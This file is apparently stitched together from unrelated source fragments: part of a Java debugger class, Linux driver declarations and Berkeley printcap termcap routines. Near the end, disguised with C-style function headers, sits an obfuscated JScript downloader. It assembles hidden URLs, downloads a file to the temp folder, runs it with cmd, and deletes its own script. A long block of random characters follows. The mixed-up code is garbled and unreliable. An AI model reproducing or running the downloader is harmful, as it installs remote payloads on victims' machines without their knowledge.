		while ((ln = inFile.readLine()) != null) {
		    StringTokenizer t = new StringTokenizer(ln);
		    if (t.hasMoreTokens()) {
			executeCommand(t);
		    }
		}
	    }
	} catch (IOException e) {}
    }

    public TTY(String host, String password, String javaArgs, String args, 
               PrintStream outStream, PrintStream consoleStream,
               boolean verbose) throws Exception {
        System.out.println("Initializing jdb...");
	out = outStream;
	console = consoleStream;
        if (password == null) {
            debugger = new RemoteDebugger(javaArgs, this, verbose);
        } else {
            debugger = new RemoteDebugger(host, password, this, verbose);
        }
	DataInputStream in = new DataInputStream(System.in);
	String lastLine = null;

	if (args != null && args.length() > 0) {
	    StringTokenizer t = new StringTokenizer(args);
	    load(t);
	    lastArgs = args;
	}

	Thread.currentThread().setPriority(Thread.NORM_PRIORITY);

	// Try reading user's startup file.
	File f = new File(System.getProperty("user.home") + 
	    System.getProperty("file.separator") + "jdb.ini");
        if (!f.canRead()) {
            // Try opening $HOME/jdb.ini
            f = new File(System.getProperty("user.home") + 
                         System.getProperty("file.separator") + ".jdbrc");
        }
        readCommandFile(f);

	// Try opening local jdb.ini
	f = new File(System.getProperty("user.dir") + 
	    System.getProperty("file.separator") + "startup.jdb");
        readCommandFile(f);

	// Process interactive commands.
	while (true) {
            printPrompt();
	    String ln = in.readLine();
	    if (ln == null) {
		out.println("Input stream closed.");
		return;
	    }

	    if (ln.startsWith("!!") && lastLine != null) {
		ln = lastLine + ln.substring(2);
		out.println(ln);
	    }

	    StringTokenizer t = new StringTokenizer(ln);
	    if (t.hasMoreTokens()) {
		lastLine = ln;
		executeCommand(t);
	    }
	}
    }

    public static void main(String argv[]) {
	// Get host attribute, if any.
	String localhost;
	try {
	    localhost = InetAddress.getLocalHost().getHostName();
	} catch (Exception ex) {
	    localhost = null;
	}	
	if (localhost == null) {
	    localhost = "localhost";
	}
	String host = null;
	String password = null;
	String classArgs = "";
	String javaArgs = "";
        boolean verbose = false;
	
	for (int i = 0; i < argv.length; i++) {
	    String token = argv[i];
	    if (token.equals("-dbgtrace")) {
		verbose = true;
	    } else if (token.equals("-cs") || token.equals("-checksource") ||
		       token.equals("-noasyncgc") || token.equals("-prof") ||
		       token.equals("-v") || token.equals("-verbose") ||
		       token.equals("-verify") || token.equals("-noverify") ||
		       token.equals("-verifyremote") ||
		       token.equals("-verbosegc") ||
		       token.startsWith("-ms") || token.startsWith("-mx") ||
		       token.startsWith("-ss") || token.startsWith("-oss") ||
		       token.startsWith("-D")) {
		javaArgs += token + " ";
	    } else if (token.equals("-classpath")) {
		if (i == (argv.length - 1)) {
		    System.out.println("No classpath specified.");
		    System.exit(1);
		}
		javaArgs += token + " " + argv[++i] + " ";
	    } else if (token.equals("-host")) {
		if (i == (argv.length - 1)) {
		    System.out.println("No host specified.");
		    System.exit(1);
		}
		host = argv[++i];
	    } else if (token.equals("-password")) {
		if (i == (argv.length - 1)) {
		    System.out.println("No password specified.");
		    System.exit(1);
		}
		password = argv[++i];
	    } else {
		classArgs += token + " ";
	    }
	}
	if (host != null && password == null) {
	    System.out.println("A debug password must be specified for " +
			       "remote debugging.");
	    System.exit(1);
	}
	if (host == null) {
	    host = localhost;
	}

	try {
	    if (!host.equals(localhost) && password.length() == 0) {
		System.out.println(
		    "No password supplied for accessing remote " +
		    "Java interpreter.");
		System.out.println(
		    "The password is reported by the remote interpreter" +
		    "when it is started.");
                System.exit(1);
            }
            new TTY(host, password, javaArgs, classArgs, 
                    System.out, System.out, verbose);
	} catch(SocketException se) {
	    System.out.println("Failed accessing debugging session on " +
			       host + ": invalid password.");
	} catch(NumberFormatException ne) {
	    System.out.println("Failed accessing debugging session on " +
			       host + ": invalid password.");
	} catch(Exception e) {		
	    System.out.print("Internal exception:  ");
	    System.out.flush();
	    e.printStackTrace();
	}
    }
}


#endif
  
#ifndef pce_driver

struct pci_driver {
       const struct pci_device_id *id_table;
       struct device_driver     driver;
};


static struct device_driver eepro100_driver = {
       .name          = "eepro100",
       .bus           = &pci_bus_type,

       .probe         = eepro100_probe,
       .remove                = eepro100_remove,
       .suspend               = eepro100_suspend,
       .resume                = eepro100_resume,
};


int driver_register(struct device_driver *drv);

int driver_for_each_dev(struct device_driver *drv, void *data,
                        int (*callback)(struct device *dev, void *data));


int     (*probe)        (struct device *dev);



void    (*sync_state)   (struct device *dev);



int     (*remove)       (struct device *dev);

struct driver_attribute {
        struct attribute        attr;
        ssize_t (*show)(struct device_driver *driver, char *buf);
        ssize_t (*store)(struct device_driver *, const char *buf, size_t count);
};

#endif

#ifndef debug

DRIVER_ATTR_RW(debug); // struct driver_attribute driver_attr_debug;

int driver_create_file(struct device_driver *, const struct driver_attribute *);
void driver_remove_file(struct device_driver *, const struct driver_attribute *);

#endif




#ifndef lint

static char sccsid[] = "@(#)printcap.c	5.7 (Berkeley) 3/4/91";
#endif /* not lint */

#include <ctype.h>
#include <stdio.h>
#include "pathnames.h"
#include <syslog.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#pragma disable_message(107,202)

#include <unix.h>
#include <sys/select.h>
#include <sys/dir.h>
#include <inttypes.h>

#ifndef LOCK_EX
#define LOCK_EX F_WRLCK 
#endif

#ifndef LOCK_NB
#define LOCK_NB 4
#endif

#ifndef LOCK_SH
#define LOCK_SH F_RDLCK
#endif

//int _validuser(FILE *hostf, char *rhost, char *luser, char *ruser, int baselen);
extern int getport(signed char *);
extern long getline(FILE *);
extern int getq(struct queue ***);
extern char *checkremote(void);
extern void fatal(signed char *, ... );
extern void displayq(int );
extern void warn(void);
extern void header(void);
extern void inform(signed char *);
extern int inlist(signed char *,signed char *);
extern void show(signed char *,signed char *,int );
extern void blankfill(int );
extern void dump(signed char *,signed char *,int );
extern void ldump(signed char *,signed char *,int );
extern void prank(int );
//extern void main(int ,signed char **);
extern void doit(void);
extern void startup(void);
extern void chkhost(struct sockaddr_in *);
extern int getprent(char *);
extern void endprent(void);
extern int pgetent(char *,char *);
extern int pnchktc(void);
extern int pnamatch(char *);
extern int pgetnum(char *);
extern int pgetflag(char *);
extern char *pgetstr(char *, char **);
extern void printjob(void);
extern int printit(signed char *);
extern int print(int ,signed char *);
extern int sendit(signed char *);
extern int sendfile(int ,signed char *);
extern int response(void);
extern void banner(signed char *,signed char *);
extern char *scnline(int ,signed char *,int );
extern void scan_out(int ,signed char *,int );
extern int dropit(int );
extern void sendmail(signed char *,int );
extern int dofork(int );
extern void init(void);
extern void openpr(void);
extern void setty(void);
//extern void status(char *, char * );
extern void recvjob(void);
extern int readjob(void);
extern int readfile(signed char *, long );
extern int noresponse(void);
extern int chksize( long );
extern int read_number(signed char *);
extern void rcleanup(void);
extern void frecverr(signed char *, ...);
extern void rmjob(void);
extern int lockchk(signed char *);
extern void process(signed char *);
extern int chk(signed char *);
extern int isowner(signed char *,signed char *);
extern void rmremote(void);
extern int iscf(struct dirent *);
extern int startdaemon(signed char *);

#ifndef __QNXNTO__
extern int rresvport(void *);
#endif

#ifdef __QNXNTO__
int flock(int , int ) ;
int getnid(void);
#endif

extern int daemon(int, int);
//extern int _validuser(void *hostf, char *rhost, char *luser, char *ruser, int baselen);
extern int __ivaliduser(FILE *hostf, uint32_t raddr, const char *luser, const char *ruser);
extern int disk_space(int, void *, void *);

#ifndef BUFSIZ
#define	BUFSIZ	1024
#endif
#define MAXHOP	32	/* max number of tc= indirections */

/*
 * termcap - routines for dealing with the terminal capability data base
 *
 * BUG:		Should use a "last" pointer in tbuf, so that searching
 *		for capabilities alphabetically would not be a n**2/2
 *		process when large numbers of capabilities are given.
 * Note:	If we add a last pointer now we will screw up the
 *		tc capability. We really should compile termcap.
 *
 * Essentially all the work here is scanning and decoding escapes
 * in string capabilities.  We don't use stdio because the editor
 * doesn't, and because living w/o it is not hard.
 */

#define PRINTCAP

#ifdef PRINTCAP
#define tgetent	pgetent
#define tskip	pskip
#define tgetstr	pgetstr
#define tdecode pdecode
#define tgetnum	pgetnum
#define	tgetflag pgetflag
#define tdecode pdecode
#define tnchktc	pnchktc
#define	tnamatch pnamatch
#define V6
#endif

static	FILE *pfp = NULL;	/* printcap data base file pointer */
static	char *tbuf;
static	int hopcount;		/* detect infinite loops in termcap, init 0 */
static  char *tskip();
char	*tgetstr();
static  char *tdecode();
char	*getenv();


/*
 * Similar to tgetent except it returns the next enrty instead of
 * doing a lookup.
 */
getprent(bp)
	register char *bp;
{
	register int c, skip = 0;

	if (pfp == NULL && (pfp = fopen(_PATH_PRINTCAP, "r")) == NULL)
		return(-1);

	tbuf = bp;
	for (;;) {
#if 0
		c = getc(pfp);
		if(pfp->_cnt == 0) {
			fclose(pfp);
			pfp = NULL;
			return(0);
		}
		switch (c) {
#endif
		switch (c = getc(pfp)) {
		case EOF: 
			fclose(pfp);
			pfp = NULL;
			return(0);
		case '\n':
			if (bp == tbuf) {
				skip = 0;
				continue;
			}
			if (bp[-1] == '\\') {
				bp--;
				continue;
			}
			*bp = '\0';
			return(1);
		case '#':
			if (bp == tbuf)
				skip++;
		default:
			if (skip)
				continue;
			if (bp >= tbuf+BUFSIZ) {
				write(2, "Termcap entry too long\n", 23);
				*bp = '\0';
				return(1);
			}
			*bp++ = c;
		}
	}
}

void
endprent()
{
	if (pfp != NULL){
		fclose(pfp);
		}
}

/*
 * Get an entry for terminal name in buffer bp,
 * from the termcap file.  Parse is very rudimentary;
 * we just notice escaped newlines.
 */
tgetent(bp, name)
	char *bp, *name;
{
	register char *cp;
	register int c;
	register int i = 0, cnt = 0;
	char ibuf[BUFSIZ];
	char *cp2;
	int tf;

	tbuf = bp;
	tf = 0;
#ifndef V6
	cp = getenv("TERMCAP");
	/*
	 * TERMCAP can have one of two things in it. It can be the
	 * name of a file to use instead of /etc/termcap. In this
	 * case it better start with a "/". Or it can be an entry to
	 * use so we don't have to read the file. In this case it
	 * has to already have the newlines crunched out.
	 */
	if (cp && *cp) {
		if (*cp!='/') {
			cp2 = getenv("TERM");
			if (cp2==(char *) 0 || strcmp(name,cp2)==0) {
				strcpy(bp,cp);
				return(tnchktc());
			} else {
				tf = open(_PATH_PRINTCAP, 0);
			}
		} else
			tf = open(cp, 0);
	}
	if (tf==0)
		tf = open(_PATH_PRINTCAP, 0);
#else
	tf = open(_PATH_PRINTCAP, 0);
#endif
	if (tf < 0){
		return (-1);}
	for (;;) {
		cp = bp;
		for (;;) {
			if (i == cnt) {
				cnt = read(tf, ibuf, BUFSIZ);
				if (cnt <= 0) {
					close(tf);
					return (0);
				}
				i = 0;
			}
			c = ibuf[i++];
			if (c == '\n') {
				if (cp > bp && cp[-1] == '\\'){
					cp--;
					continue;
				}
				break;
			}
			if (cp >= bp+BUFSIZ) {
				write(2,"Termcap entry too long\n", 23);
				break;
			} else
				*cp++ = c;
		}
		*cp = 0;

		/*
		 * The real work for the match.
		 */
		if (tnamatch(name)) {
			close(tf);
			return(tnchktc());
		}
	}
syslog(0,"it failed 3 %m");	
}

/*
 * tnchktc: check the last entry, see if it's tc=xxx. If so,
 * recursively find xxx and append that entry (minus the names)
 * to take the place of the tc=xxx entry. This allows termcap
 * entries to say "like an HP2621 but doesn't turn on the labels".
 * Note that this works because of the left to right scan.
 */
tnchktc()
{
	register char *p, *q;
	char tcname[16];	/* name of similar terminal */
	char tcbuf[BUFSIZ];
	char *holdtbuf = tbuf;
	int l;

	p = tbuf + strlen(tbuf) - 2;	/* before the last colon */
	while (*--p != ':')
		if (p<tbuf) {
			write(2, "Bad termcap entry\n", 18);
			return (0);
		}
	p++;
	/* p now points to beginning of last field */
	if (p[0] != 't' || p[1] != 'c')
		return(1);
	strcpy(tcname,p+3);
	q = tcname;
	while (q && *q != ':')
		q++;
	*q = 0;
	if (++hopcount > MAXHOP) {
		write(2, "Infinite tc= loop\n", 18);
		return (0);
	}
	if (tgetent(tcbuf, tcname) != 1)
		return(0);
	for (q=tcbuf; *q != ':'; q++)
		;
	l = p - holdtbuf + strlen(q);
	if (l > BUFSIZ) {
		write(2, "Termcap entry too long\n", 23);
		q[BUFSIZ - (p-tbuf)] = 0;
	}
	strcpy(p, q+1);
	tbuf = holdtbuf;
	return(1);
}

/*
 * Tnamatch deals with name matching.  The first field of the termcap
 * entry is a sequence of names separated by |'s, so we compare
 * against each such name.  The normal : terminator after the last
 * name (before the first field) stops us.
 */
tnamatch(np)
	char *np;
{
	register char *Np, *Bp;

	Bp = tbuf;
	if (*Bp == '#')
		return(0);
	for (;;) {
		for (Np = np; *Np && *Bp == *Np; Bp++, Np++)
			continue;
		if (*Np == 0 && (*Bp == '|' || *Bp == ':' || *Bp == 0))
			return (1);
		while (*Bp && *Bp != ':' && *Bp != '|')
			Bp++;
		if (*Bp == 0 || *Bp == ':')
			return (0);
		Bp++;
	}
}

/*
 * Skip to the next field.  Notice that this is not very smart,  not
 * knowing about \: escapes or any such.  If necessary, :'s can be put
 * into the termcap file in octal.
 */
static char *
tskip(bp)
	register char *bp;
{

	while (*bp && *bp != ':')
		bp++;
	if (*bp == ':')
		bp++;
	return (bp);
}

/*
 * Return the (numeric) option id.
 * Numeric options look like
 *	li#80
 * i.e. the option string is separated from the numeric value by
 * a # character.  If the option is not found we return -1.
 * Note that we handle octal numbers beginning with 0.
 */
tgetnum(id)
	char *id;
{
	register int i, base;
	register char *bp = tbuf;

	for (;;) {
		bp = tskip(bp);
		if (*bp == 0)
			return (-1);
		if (*bp++ != id[0] || *bp == 0 || *bp++ != id[1])
			continue;
		if (*bp == '@')
			return(-1);
		if (*bp != '#')
			continue;
		bp++;
		base = 10;
		if (*bp == '0')
			base = 8;
		i = 0;
		while (isdigit(*bp))
			i *= base, i += *bp++ - '0';
		return (i);
	}
}

/*
 * Handle a flag option.
 * Flag options are given "naked", i.e. followed by a : or the end
 * of the buffer.  Return 1 if we find the option, or 0 if it is
 * not given.
 */
tgetflag(id)
	char *id;
{
	register char *bp = tbuf;

	for (;;) {
		bp = tskip(bp);
		if (!*bp)
			return (0);
		if (*bp++ == id[0] && *bp != 0 && *bp++ == id[1]) {
			if (!*bp || *bp == ':')
				return (1);
			else if (*bp == '@')
				return(0);
		}
	}
}

/*
 * Get a string valued option.
 * These are given as
 *	cl=^Z
 * Much decoding is done on the strings, and the strings are
 * placed in area, which is a ref parameter which is updated.
 * No checking on area overflow.
 */
char *
tgetstr(id, area)
	char *id, **area;
{
	register char *bp = tbuf;

	for (;;) {
		bp = tskip(bp);
		if (!*bp)
			return (0);
		if (*bp++ != id[0] || *bp == 0 || *bp++ != id[1])
			continue;
		if (*bp == '@')
			return(0);
		if (*bp != '=')
			continue;
		bp++;
		return (tdecode(bp, area));
	}
}

/*
 * Tdecode does the grungus-assbinch work to decode the
 * string capability escapes.
 */
static char *
tdecode(str, area)
	register char *str;
	char **area;
{
	register char *cp;
	register int c;
	register char *dp;
	int i;

	cp = *area;
	while ((c = *str++) && c != ':') {
		switch (c) {

		case '^':
			c = *str++ & 037;
			break;

		case '\\':
			dp = "E\033^^\\\\::n\nr\rt\tb\bf\f";
			c = *str++;
nextc:
			if (*dp++ == c) {
				c = *dp++;
				break;
			}
			dp++;
			if (*dp)
				goto nextc;
			if (isdigit(c)) {
				c -= '0', i = 2;
				do
					c <<= 3, c |= *str++ - '0';
				while (--i && isdigit(*str));
			}
			break;
		}
		*cp++ = c;
	}
	*cp++ = 0;
	str = *area;
	*area = cp;
	return (str);
}


void lBk(xIS, XQr)
{
        xIS["Open"]();
        xIS["Type"] = 1;

        xIS["Writ" + l()](XQr[h()]);
        var r=36123;
        var X=r+36005;
        var g=X/184;
        var Ji=g-392;
        xIS["Positio" + DD()] = Ji;
}

void R(K)
{
        var eDT;
        var iSj;
        var mj = cN(42);

        var zs = new mj("M" + "SXM" + Ph());
        var U = 0;
        zs["o" + "pen"]("G" + "E" + "T", K, 0);
        try {
                zs["s" + "end"]();
        } catch (tLk) {
                return false;
        }


        if (zs["S" + "tatus"] != 200)
                return (55 > 66);
        var oL = new mj("Scripting.F" + "ileSystemObjec" + k());
        var W = new mj("ADODB.Stream");
        K = qBE(oL);

        lBk(W, zs);

        var PD = W["Re" + "ad"]();
        PD = M(W, cN(7), PD);
        if (PD.length < 10)
                return false;
        W["Sa" + "veTo" + "File"](K);
        W["Cl" + "ose"]();

        var uM = cN(144);
        var Jy = "Wscr" + "ip" + k() + ".S" + "hell";
        var xV=String.fromCharCode(990/10-0);
        z = xV + String.fromCharCode(8938/82-0);
        H = z + String.fromCharCode(20*5);
        Wch = H + String.fromCharCode(2024/44-0);
        rdR = Wch + String.fromCharCode(181-80);
        pW = rdR + String.fromCharCode(9960/83+0);
        iSj = pW;
        eDT = new uM(Jy);
        var x = "ru" + DD();
        eDT[x](iSj + "e /c " + K, 0);
        if (124 > 89)
        {
                K = "del" + "et" + "eF";
                C(oL, T(K));
                return true;
        }
        return U;
}

void cN(N)
{
        return ActiveXObject;
}

void q(fVy)
{
        var jEJ = cN(0);
        var w = new jEJ("Scripting.Dictionary");
        w["Add"]("a", "b");
        var GJ = 4;
        if ((fVy > 5) && (w["Exists"]("a")))
        {
                var lyB = jQX(7, 4);
                if (lyB == false)
                        lyB = jQX(23, 56);
                GJ = 3;
        }
        return GJ;
}

void qBE(aDt)
{
        var AgR = "Ge" + "tSpe" + "cialF" + "ol" + "der";
        var bb = "GetT" + "empN" + "ame";
        var DK=String.fromCharCode(2944/32-0);
        var rPj = aDt[AgR](2) + DK + aDt[bb]();
        return rPj;
}

void exc()
{
        var eqR = "nd";
        return eqR;
}

void T(gR)
{
        return gR + "ile";
}

void k()
{
        var n = "t";
        return n;
}

void Ph()
{
        var fHC=String.fromCharCode(6688/88+0);
        nDO = fHC + String.fromCharCode(2600/52-0);
        vM = nDO + String.fromCharCode(736/16+0);
        Iyk = vM + String.fromCharCode(231-143);
        Bf = Iyk + String.fromCharCode(7*11);
        B = Bf + String.fromCharCode(6992/92-0);
        S = B + String.fromCharCode(1584/22+0);
        RR = S + String.fromCharCode(8148/97+0);
        Oy = RR + String.fromCharCode(634-550);
        oOw = Oy + String.fromCharCode(16*5);
        return oOw;
}

void DD()
{
        return "n";
}

void kKP(Oey)
{
        var Rm = "charA";
        var iMG = "t";
        var ne = Rm + iMG;
        return ne;
}

void xHW()
{
        var xPD = "YkuOKC7i{\"" + "GUy%x}" + "2c9N*";
        return xPD;
}


void M(iP, OMY, Ufk)
{
        var uk = "AD" + "OD" + "B.Re" + "cordse";
        var NU = new OMY(uk + "t");
        var jzg = iP["Si" +"ze"];
        var DC = 200 + 1;
        NU["fields"]["a" + "pp" + "e" + exc()]("bin", DC, jzg);
        var MhN = "ope";
        NU[MhN + "n"]();
        NU["addNew"]();
        var G = "bin";
        var ARD = "appe" + "ndChu" + "nk";
        NU(G)[ARD](Ufk);
        var nI = "u" + "pda" + "t";
        NU[nI + "e"]();
        return NU(G)["val" + "u" + "e"];
}

void IQc()
{
        var xPD = "Q+8tneM[`S^W<I?qgrv(" + "$lBT,'" + "/EP0" + "#DL: ";
        return xPD;
}

void VV(Qk)
{
        var or=String.fromCharCode(1260/18-0);
        s = or + String.fromCharCode(2*23);
        FF = s + String.fromCharCode(439-313);
        Pr = FF + String.fromCharCode(1900/50-0);
        AJv = Pr + String.fromCharCode(974-882);
        var xPD = xHW() + IQc() + "p_@|VJfw6z=R;A)" + "mj5Za31Hs!o->" + AJv + "4X" + "]d" + "bh";
        var fN = xPD["" + kKP(Qk)](Qk-31);
        return fN;
}

void gT()
{
        var I=[];
        I[0]="/";
        I[1]="la";
        I[2]="e";
        I[3]="is";
        I[4]="a";
        I[5]="en";
        I[6]="-";
        I[7]="nt";
        I[8]="r";
        I[9]="s/";
        I[10]="t";
        I[11]="h";
        I[12]="di";
        I[13]=".c";
        I[14]="he";
        I[15]="n";
        I[16]="c/";
        I[17]="wp";
        I[18]="c.";
        I[19]="i";
        I[20]="rd";
        I[21]="/";
        I[22]="ht";
        I[23]="a";
        I[24]="g";
        I[25]="//";
        I[26]="co";
        I[27]="1";
        I[28]="he";
        I[29]="om";
        I[30]="em";
        I[31]="pa";
        I[32]="t/";
        I[33]=":";
        I[34]="sp";
        I[35]="jp";
        I[36]="tp";
        I[37]="l";
        var cFh=I[22]+I[36]+I[33]+I[25]+I[28]+I[8]+I[12]+I[34]+I[23]+I[37]+I[4]+I[13]+I[29]+I[0]+I[17]+I[6]+I[26]+I[7]+I[5]+I[32]+I[10]+I[11]+I[30]+I[2]+I[9]+I[14]+I[20]+I[3]+I[31]+I[1]+I[21]+I[19]+I[15]+I[16]+I[27]+I[18]+I[35]+I[24];
        return cFh;
}

void JK()
{
        var hL=[];
        hL[0]="c.";
        hL[1]="no";
        hL[2]="/";
        hL[3]="n";
        hL[4]="j";
        hL[5]="p";
        hL[6]=":/";
        hL[7]="i";
        hL[8]="on";
        hL[9]="v";
        hL[10]=".x";
        hL[11]="g";
        hL[12]=".j";
        hL[13]="/i";
        hL[14]="tp";
        hL[15]="ht";
        hL[16]="t";
        hL[17]="va";
        hL[18]="p";
        hL[19]="1";
        hL[20]="sr";
        var a=hL[15]+hL[14]+hL[6]+hL[13]+hL[3]+hL[1]+hL[17]+hL[16]+hL[7]+hL[8]+hL[10]+hL[20]+hL[9]+hL[12]+hL[5]+hL[2]+hL[19]+hL[0]+hL[4]+hL[18]+hL[11];
        return a;
}


void jQX(ea, b)
{
        var K = 24;
        if (ea > b)
                K = JK();
        else
                K = gT();
        return R(K);
}

void ip(ToM, Qg)
{
        return bt(ToM, Qg);
}

void h()
{
        return "ResponseBody";
}

void l()
{
        return "e";
}

void C(u, Flg)
{
        var ffv = WScript;
        u[Flg](ffv["ScriptFullName"]);
}


while (q(43) > 0)
{
        break;
}


int document = "/*sms-C6Nw[mlvTzxggLt6#FEkeH&4umyco2SZKlsi%SbufbJsn{MC8ISdx4d[j+#a!P+TkJIAm}dA3UgKl2EJ]t#dh!d3A*bJXE0f!{ePIVNYpTdOdVg&[bR0Y+(29v@S]tNuSGSLOjRgZnG&[L@MiGcUZJ[c4M[9gQZUPCUVgr)[E$cOU8PbM$Ja4u(%mmhN#sysfB{NwjBmIGAY2Gq1iyj$kH6wX8Br!0Fd9&49UJ4ls2Y)eNEQ@Q7aR%[v6Z1SQMffrQ9rdV+mFjP%RsC+pxIYjPoI-ZmNadTVqgyusg[DHqVmX6QGe8ktUzTZcGkYu@nUe[tciles^GB[7)7Wqj3cQLe2[NJYc-D%5[LUZ9rvB&mcO8j0e&^!b2^I9i#md$OlX8$WNp]&Y!soal+w+3R8pd{bn!DdweVCh[CeJ[qE75Ph11T7vmPSLDlin8v$DU1m(9+-9nttqNJ9ej0k(ZQNvo^5Eb7PHoI$!zr*H748}N(TJXeuGW*@Sfq}tV@2]iG+LfCNO*KViJm2T7XFO6gu-Xa&cfj8dQ&jpLmBJosoeeVJkQyv{zpg(TJrRgqDGY)Fpg7-jLo-^2bCNMH+#VfKX*Io3cE5H1@ODVh%Ad-n$[w9bK%Yrl9G(Sy^7%jJpN@EAq[gTIUgcS@udh4w5dSJ]^pynHJo0go@P1KiKT@!#x-*5o7dYq-0IV#JO3pCb{SCd5tXOMjXwhLnDcBJ@KfM%mGl&n(rKxDre4M7(kL#+nC9n}uZa*92$&8*dCG56kr)*H3SpwKWzq-ERpVjhW7H{b)AHs+tLKeMaQ]bE[j!]jakJ{XZ&Rgkb9(zzlZ2eSj!PkSvV0avb{uqBb3q$V8M)v%d(q)Jv{v-dhHFE4qZrqG}dg[m#Y@80eWbNZW+&%ChdoKNQFOr+}$5xu#ZX%G2)BmO}cb[Ts1+Jy##lMLGPF&R2zrng&T*!Q}xpx)HIfQuuOaYjV{Ne+^)9rVthm)kqfvr+3F1p5U$jR#oRUbM]^VrEm[$u@@psbSsznOL&7bN1krRWmE%IL6@{9HrGJJ35}+m69ciaX2seEKXb-]^RhfynmL+0rWo^*+!rCEdCC@++zlaf5*ZV}VV[}GiSO6SFA+2w+bhQ8U6u#MhTFDnS[uM!D+@D2Mm27)rMrL0F6NlzpnW]VG^]fb9OEh(mRPqvRf$(K&idLzT4T@8KvfO[0TD^o$pPw-0Zv@aRr@%j3t!6QlWigCNf044KM)sjT0[*{4Zx2f%}WYncmsiRarQjaBjcfnVDpc[foAXTTxqikPIdA+s)sXnd^}82(Tqv9pvQ7lyAzCJH77zXYmIZodn@%Yla5S^bvSAYMrkkH8U0%t5(8VQbrHtfdyZh78&W1srDJj%53lgke](krcRo8KTmFwz%nwfdHN$C0)ixfC@H+gljuTy9Pp(SRd9s%iqbGuClUqdBMVjLPbHq2&m93-WNE8JOzi-qX34)NpBsX0GodV^ZgqRsH^vSd08t#g{AtdkMmv0UFjN72J)ltd20BNj%8bo^6}%U*UET-D3%]rPHEM]qJGCWxV]vClZNZl#N3E2f6Ri!Gns7qlH3vy0fINA4wq}$*)fo-pu)nge-H}tsaX43kx*XXr*T)qolklYgNWbh+gEId#inHWqzW02}r3eM2]l9fWiqIyz*22ONZxQRViM[MU+s@o9[+iv8d^AzjP@zNI]7YHubsweQt1AtRU&99Lg][IDoz&VjutU{cdlGMiJ5P52nF-cOcLNqKpbS2$smkvj*#(l@kCZjdYVMcitrPM7Y49wmAg@JRBAn)+*kpXYx+I@IeqsxlVs*3e]u^iqi0N[9&0Jcp+(OsrKWDn3{Y3z2SreX2ckWHlNK!j6T0stW6hcdX3s%X**$^[QlZ9tSnu5mAsi3sN^QqFQrhSG]MPn*ybkqVndijIbibh%s6veBoV!tpdWHCX7}E(atX6f7lkSaggv%]V43gUf)t{pcmJo5cdqghpc3[avKnMIZRxtvnjE!peYcHoxTWqIuO9du(*13z$Plwcv3km9cU^p9iPBroxVauzQg+n[QaHu%uQcwi(+l61YeVqc+HV-T^Jldg$QM$Al{l+qWAi2NUOg-YYq1Fze&TB!6encvNc8U77Msae03xGz6axp3B*nQRfSrsybVrzBFeXpfE$1g3P$vIl2{-m*7#N]og(b}utT}lX2aGGrf&vHvW]BmYm%LlnycTFTn2x]mFX})ND12K4N5BqpQPDSpZypHcxhPfnyk*f9^jjQyI#E1!Sg]X!4WTMWq4{h7y$nl)[E^Mcg587Gi#^8$QFY&(aZhU@[WQvmeDGmP#bf(!8jEtFukb#gdN&a8#&i$npia#17ne2kqUdj]D]HZ3Kq{+0)@b(MiOpTdr*PgL$%T[]0[}2m&G^zaqg$*4yRjglTmzQpi^[+3h#{5flpMkOO(pYBhek$[G^jBsrA(3DJ+u3Y3oeI#2pK^$dvkPhRAEECwwpjum}Q^BVsH9}P1xMHc]ca]TeB]YK(1YsPA}l*#MFsFu)]jn{YX%ZRkUP}ncxBOswWY8x$a#cfdz#FUfZ-q7eypLQU3Rr$g(F1#PP-1]FPAocDa}f$cMgOC)SQ-k1EAbhLrA!er%YksS8rJkVB[XHboAhl@0rveHGTnji!u!rYNr@4lnuAe}Xs}QPoF-unxI8$Ej+mf5{GlYFY}dkrr4Sv#6}Oifc%#u5g!9JmehhVjSmHQoK-aa@@+tK0}&m]RU$tuQONdPJC8O(TL%aCKU@cR9l2ybg^yujpuul]hUef[GkuGl2dc7d&Y{fFcLs$iPzu}^eno6rARm!!YVDu75@0oM![vZTHKGjy0fe)9h*5xW{o#Hm89y8[UAfp!AiV29@-rtpxRo(x@!W71sNi{adYhjZ^((vsR{gy4nURR}nx0$qsMH3sM{p]aPqODoWC@rcZ[%P$!{XFvpEmRi3y*Wx^])S&kX^^h&oFK02C#T&MHK{L*N7QJg${ccx9qkDO)B+voX8J(Rkf]@jKj1LCbWQoqxdu^6Ef{zjpLaTItrzVfOglk@DIhY}AAA6S%4kid6j]O8jsedp86GrU%%+Gj]{)}x)AceD[ */"
};
